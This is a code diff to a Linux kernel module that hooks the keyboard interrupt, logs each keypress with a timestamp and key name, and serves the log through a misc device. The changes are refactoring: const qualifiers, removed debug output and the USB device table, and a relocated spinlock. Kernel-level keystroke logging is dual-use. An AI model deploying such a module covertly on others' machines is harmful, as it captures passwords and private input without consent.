@@ -6,16 +6,8 @@ DEFINE_MUTEX(keyboard_mutex);
 DEFINE_SPINLOCK(keyboard_spinlock);
 LIST_HEAD(keypress_list);
 
-static struct key_press keys[CB_SIZE];
+static struct key_press keys;
 
-static const struct usb_device_id usb_module_id_table[2] = {
-	{ USB_INTERFACE_INFO(
-			USB_INTERFACE_CLASS_HID,
-			USB_INTERFACE_SUBCLASS_BOOT,
-			USB_INTERFACE_PROTOCOL_KEYBOARD) },
-	{}
-};
-MODULE_DEVICE_TABLE(usb, usb_module_id_table);
 
 static u8 scancodes[CB_SIZE] = {0x0};
 static int windex = -1;
@@ -28,7 +20,7 @@ static int is_key_pressed(unsigned int scancode)
 	return !(scancode & RELEASED_MASK);
 }
 
-struct scan_code codes[] = {
+static const struct scan_code codes[] = {
 	{0x0, "NULL"},
 	{0x1, "Escape"},
 	{0x2, "1"},
@@ -158,10 +150,10 @@ static int misc_open(struct inode *inode, struct file *filp)
 	int			written;
 	struct key_press	*tmp, *next;
 
-	spin_lock(&keyboard_spinlock);
 	buffer = kmalloc(sizeof(char) * (MISC_SIZE * 45), GFP_KERNEL);
 	if (!buffer)
 		return -ENOMEM;
+	spin_lock(&keyboard_spinlock);
 	list_for_each_entry_safe(tmp, next, &keypress_list, list) {
 		if (index >= (int)list_size - MISC_SIZE) {
 			written = sprintf(proto, "[%02d:%02d:%02d] (0x%02X) %s %s\n", 
@@ -187,7 +179,7 @@ static int misc_release(struct inode *inode, struct file *filp)
 	return 0;
 }
 
-static struct file_operations fops = {
+static const struct file_operations fops = {
 	.read		= misc_read,
 	.open		= misc_open,
 	.release	= misc_release
@@ -307,13 +299,11 @@ static int driver_irq_reg(void)
 static void driver_irq_unregister(void)
 {
 	struct key_press *temp, *next;
-	int i = 0;
+
 	free_irq(PL2_IRQ, &keys);
 	list_for_each_entry_safe(temp, next, &keypress_list, list) {
 		list_del(&temp->list);
 		kfree(temp);
-		i++;
-		pr_info("number %d\n", i);
 	}
 }
 
@@ -321,9 +311,7 @@ static void driver_irq_unregister(void)
 static int __init main(void)
 {
 	int err;
-	for (int i = 0; i < CB_SIZE; i++) {
-		keys[i].name = NULL;
-	}
+
 	err = driver_irq_reg();
 	if (err) {
 		pr_err("IRQ failed\n");
